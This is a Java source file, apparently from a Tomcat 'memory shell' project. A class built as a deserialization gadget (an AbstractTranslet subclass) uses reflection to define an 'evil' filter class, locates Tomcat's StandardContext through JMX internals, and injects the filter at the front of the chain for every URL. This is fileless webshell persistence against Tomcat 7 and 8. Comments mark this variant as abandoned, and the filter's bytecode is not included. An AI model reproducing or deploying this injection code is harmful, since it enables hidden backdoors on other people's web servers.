package com.memeryShell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.session.ManagerBase;
import org.apache.catalina.session.StandardManager;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.modeler.BaseModelMBean;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

/*
 * 荒废的玩意
 * 本意是：Filter和DefineClass的类分开。抹除掉Filter即继承AbstractTranslet又实现Filter的特征
 * 但是，由于会出现System ClassLoader加载不到类，且两个类合一起体积过大的问题
 * 遂放弃
 * */
public class DefineClass extends AbstractTranslet {

    private static byte[] classBytes;

    static {
        System.out.println("[+] DefineClass Running....");
        try{
            Object filter = defineClass();
            StandardContext standardContext = getStandardContext();
            if (standardContext != null){
                memery(standardContext, filter);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static Object defineClass() throws Exception{
        //rebuild evil Filter class
        //由于classBytes是动态javassist生成的。暂时类中没写
        //反射调用即可
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
        defineClassMethod.setAccessible(true);
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
        Class evilFilterClass = (Class) defineClassMethod.invoke(systemClassLoader, new Object[]{
            "com.memeryShell.tomcat.MyFilter",
            classBytes,
            0,
            classBytes.length
        });
        //Inject Memery Filter
        Object evilFilter = evilFilterClass.newInstance();
        return evilFilter;
    }

    private static void memery(StandardContext standardContext, Object f) throws Exception{
        //生成一个FilterMap
        //生成一个ApplicationFilterConfig
        //注意区分Tomcat7 和 Tomcat8
        Class filterDefClass = null;
        Class filterMapClass = null;
        Object filterMap = null;
        //Tomcat7
        try {
            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        }
        //Tomcat8
        catch (ClassNotFoundException e){
            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        }
        Constructor filterMapClassDeclaredConstructor = filterMapClass.getDeclaredConstructor();
        filterMap = filterMapClassDeclaredConstructor.newInstance();
        Method setFilterNameMethod = filterMap.getClass().getDeclaredMethod("setFilterName", String.class);
        setFilterNameMethod.invoke(filterMap, "myFilter");
        Method addURLPatternMethod = filterMap.getClass().getDeclaredMethod("addURLPattern", String.class);
        addURLPatternMethod.invoke(filterMap,"/*");


        Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();
        Method setFilterMethod = filterDef.getClass().getDeclaredMethod("setFilter", Filter.class);
        setFilterMethod.setAccessible(true);
        setFilterMethod.invoke(filterDef, f);

        Field filterNameField = filterDefClass.getDeclaredField("filterName");
        filterNameField.setAccessible(true);
        filterNameField.set(filterDef, "myFilter");

        Constructor<ApplicationFilterConfig> applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(
            org.apache.catalina.Context.class,
            filterDefClass
        );
        applicationFilterConfigConstructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(
            standardContext,
            filterDef
        );

        //拿到HashMap<String, ApplicationFilterConfig> filterConfigs
        Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
        filterConfigsField.setAccessible(true);
        HashMap<String, ApplicationFilterConfig> filterConfig = (HashMap) filterConfigsField.get(standardContext);
        filterConfig.put("myFilter", applicationFilterConfig);

        Field contextFilterMapsField = StandardContext.class.getDeclaredField("filterMaps");
        contextFilterMapsField.setAccessible(true);
        //private static final类。直接反射操作吧，省事
        Object contextFilterMaps = contextFilterMapsField.get(standardContext);
        //调用其addBefore()，让我们的Filter打在最前面

        Method addBeforeMethod = contextFilterMaps.getClass().getDeclaredMethod("addBefore", filterMapClass);
        addBeforeMethod.setAccessible(true);
        addBeforeMethod.invoke(contextFilterMaps, filterMap);
    }

    /**
     * 使用获取StandardContext
     * */
    private static StandardContext getStandardContext(){
        StandardContext standardContext = null;
        try {
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            mbsInterceptorField.setAccessible(true);
            Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);

            Field repositoryField = mbsInterceptor.getClass().getDeclaredField("repository");
            repositoryField.setAccessible(true);
            Object repository = repositoryField.get(mbsInterceptor);

            Field domainTbField = repository.getClass().getDeclaredField("domainTb");
            domainTbField.setAccessible(true);
            Map<String, Map<String, NamedObject>> domainTb = (Map) domainTbField.get(repository);
            Map<String, NamedObject> catalina = domainTb.get("Catalina");
            Set<String> set = catalina.keySet();

            //
            ArrayList<Context> standardContextArrayList = new ArrayList();

            //循环两次
            //第一次，拿到所有的webapp的standerContext
            for (String key : set) {
                NamedObject namedObject = catalina.get(key);
                //一层层判断下去，防止报错
                if (namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class)) {
                    BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                    //判断是不是Catalina:context,type=Manager。先单独把这两领出来
                    //判断key就可了
                    if (key.startsWith("context=") && key.endsWith(",type=Manager")) {
                        StandardManager managedResource = (StandardManager) baseModelMBean.getManagedResource();
                        //由于Tomcat7 和 Tomcat8 稍有差异。通过反射获取较为稳定
                        //用Catch来区分是Tomcat7 还是 Tomcat8
                        //Tomcat7 为 container
                        try {
                            Field contextFiled = ManagerBase.class.getDeclaredField("container");
                            contextFiled.setAccessible(true);
                            StandardContext context = (StandardContext) contextFiled.get(managedResource);
                            standardContextArrayList.add(context);
                        }
                        //尝试Tomcat8
                        //Tomcat8 为 context
                        catch (NoSuchFieldException e){
                            Field contextFiled = ManagerBase.class.getDeclaredField("context");
                            contextFiled.setAccessible(true);
                            StandardContext context = (StandardContext) contextFiled.get(managedResource);
                            standardContextArrayList.add(context);
                        }
                    }
                }
            }
            //第二次，根据当前的request，找到匹配的standerContext
            for (String key : set) {
                if (standardContext != null){
                    break;
                }
                NamedObject namedObject = catalina.get(key);
                BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                if (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) {
                    //能进入这里，说明获取到正确的request了
                    //这里的第0个，就可以获得maxRequestUri
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();
                    //判断下processors数量，有的是0，不是我们要找的
                    Field processorsField = requestGroupInfo.getClass().getDeclaredField("processors");
                    //拿第0个process的maxRequestUri作为contextPath
                    processorsField.setAccessible(true);
                    ArrayList<RequestInfo> processors = (ArrayList) processorsField.get(requestGroupInfo);
                    //排除掉processors是0的
                    if (processors.size() > 0){
                        RequestInfo requestInfo0 = processors.get(0);
                        String maxRequestUri = requestInfo0.getMaxRequestUri(); //As context path
                        for (Context context : standardContextArrayList) {
                            if (context.getClass().isAssignableFrom(StandardContext.class)){
                                StandardContext standardContextTmp = (StandardContext) context;
                                String standardContextPath = standardContextTmp.getPath();
                                //当前request contextPath 和 standardContextPath匹配，则操作这个standardContext，塞入内存马
                                //Do Filter Memery Shell
                                if (maxRequestUri.contains(standardContextPath)){
                                    standardContext = standardContextTmp;
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return standardContext;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
